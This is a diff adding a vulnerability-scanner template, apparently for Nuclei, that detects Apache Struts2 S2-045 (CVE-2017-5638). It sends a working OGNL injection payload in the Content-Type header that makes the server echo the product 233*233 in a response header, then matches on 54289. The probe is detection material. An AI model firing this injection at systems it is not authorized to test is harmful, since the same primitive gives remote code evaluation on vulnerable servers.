@@ -1,0 +1,34 @@
+id: local-struts2-s2-045-header-safe
+
+info:
+  name: Local Struts2 S2-045 Header Math Probe (CVE-2017-5638)
+  author: pentest-platform
+  severity: high
+  tags: safe-poc,struts2,s2-045,cve,cve2017
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+    headers:
+      Content-Type: "%{(#nike='multipart/form-data').(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-S2-045-Check','' + (233*233)))}"
+    body: ""
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "X-S2-045-Check: 54289"
+          - "X-S2-045-Check:54289"
+      - type: word
+        part: header
+        words:
+          - "54289"
+        condition: and
+        internal: false
+    extractors:
+      - type: regex
+        name: s2_045_check
+        part: header
+        regex:
+          - "X-S2-045-Check: ([0-9]+)"
